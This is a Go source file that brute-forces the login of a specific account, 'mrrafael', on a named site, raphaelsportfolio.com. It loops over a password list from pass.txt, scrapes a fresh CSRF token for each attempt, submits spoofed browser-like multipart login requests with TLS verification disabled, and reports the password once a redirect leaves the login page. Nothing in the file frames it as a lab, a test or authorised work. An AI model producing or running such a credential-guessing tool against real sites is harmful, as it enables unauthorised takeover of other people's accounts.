package main

import (
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

var (
	red      = color.Red
	green    = color.Green
	tokenKey = "csrfmiddlewaretoken"
	siteUrl  = "http://raphaelsportfolio.com/accounts/login/"
	link     = &url.URL{
		Scheme: "http",
		Host:   "raphaelsportfolio.com",
		Path:   "/accounts/login/",
	}
	username = "mrrafael"
	token    = "VlI9sa6KTBtQQN88Gqjv07xGAVEHRVIaR6wJ2dZq6IxfmrQjudfGmB8Hh60HOOS9"
)

func main() {

	loginResponse := sendLoginRequest(username, "password", token)
	res, err := ioutil.ReadAll(loginResponse.Body)
	if err != nil {
		red(err.Error())
	}
	fmt.Println(string(res))
	red(loginResponse.Status)
	compareResponse(loginResponse, "/accounts/login/")
	password := getPassword()

	for _, p := range password {
		getResponse := sendGetRequest(siteUrl)
		// get csrf token
		token := getCSRFToken(getResponse)
		// send login request
		loginResponse := sendLoginRequest(username, p, token)
		// follow 302 redirect
		redirectResponse := follow302Redirect(loginResponse)
		// get redirect url
		redirectURL := redirectResponse.Header.Get("Location")
		// if redirect url is not the login page, we have found the password
		if !contains(redirectURL, "/accounts/login/") {
			green("Password is: " + p)
			break
		}
	}

}

// function take csrf token from response
func getCSRFToken(body *http.Response) (token string) {
	bodyBytes, err := ioutil.ReadAll(body.Body)
	if err != nil {
		red(err.Error())
	}

	lines := strings.Split(string(bodyBytes), "\n")
	for _, line := range lines {
		if strings.Contains(line, tokenKey) {
			token = strings.Split(line, "\"")[5]
		}
	}

	return
}

func sendLoginRequest(username, password, token string) (resp *http.Response) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	data := `------WebKitFormBoundaryNI99Ng6KBpjBtlfb\x0d\x0aContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\x0d\x0a\x0d\x0atkn\x0d\x0a------WebKitFormBoundaryNI99Ng6KBpjBtlfb\x0d\x0aContent-Disposition: form-data; name=\"username\"\x0d\x0a\x0d\x0ausr\x0d\x0a------WebKitFormBoundaryNI99Ng6KBpjBtlfb\x0d\x0aContent-Disposition: form-data; name=\"password\"\x0d\x0a\x0d\x0apswd\x0d\x0a------WebKitFormBoundaryNI99Ng6KBpjBtlfb--\x0d\x0a`
	data = strings.Replace(data, "tkn", token, 1)
	data = strings.Replace(data, "usr", username, 1)
	data = strings.Replace(data, "pswd", password, 1)
	body := strings.NewReader(data)

	req, err := http.NewRequest("POST", "http://raphaelsportfolio.com/accounts/login/", body)
	if err != nil {
		red(err.Error())
	}
	req.URL = link
	req.Host = "raphaelsportfolio.com"
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "http://raphaelsportfolio.com")
	req.Header.Set("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryNI99Ng6KBpjBtlfb")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Referer", "http://raphaelsportfolio.com/accounts/login/")
	//req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cookie", "csrftoken=VlI9sa6KTBtQQN88Gqjv07xGAVEHRVIaR6wJ2dZq6IxfmrQjudfGmB8Hh60HOOS9")
	req.Header.Set("Connection", "close")

	resp, err = client.Do(req)
	if err != nil {
		red(err.Error())
	}
	defer func() {
		err := resp.Body.Close()
		if err != nil {
			red(err.Error())
		}
	}()
	return
}

// send get request to given url to get response
func sendGetRequest(url string) *http.Response {
	getResponse, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	return getResponse
}

// function follow 302 redirect return response
func follow302Redirect(response *http.Response) *http.Response {
	redirectURL := response.Header.Get("Location")
	redirectResponse, err := http.Get(redirectURL)
	if err != nil {
		panic(err)
	}
	return redirectResponse
}

func contains(s, word string) bool {
	return strings.Contains(s, word)
}

// function open pass.txt and get password
func getPassword() []string {
	pass, err := ioutil.ReadFile("pass.txt")
	if err != nil {
		red(err.Error())
	}
	return strings.Split(string(pass), "\n")
}

// compareResponse compares responses Location header with given url
func compareResponse(response *http.Response, url string) bool {
	redirectURL := response.Header.Get("Location")
	green("\"" + redirectURL + "\"")
	// compare redirect url with given url
	return redirectURL != url
}

// readFile reads given file and return its content
func readFile(fileName string) string {
	file, err := os.Open(fileName)
	if err != nil {
		red(err.Error())
	}
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		red(err.Error())
	}
	return string(fileBytes)
}
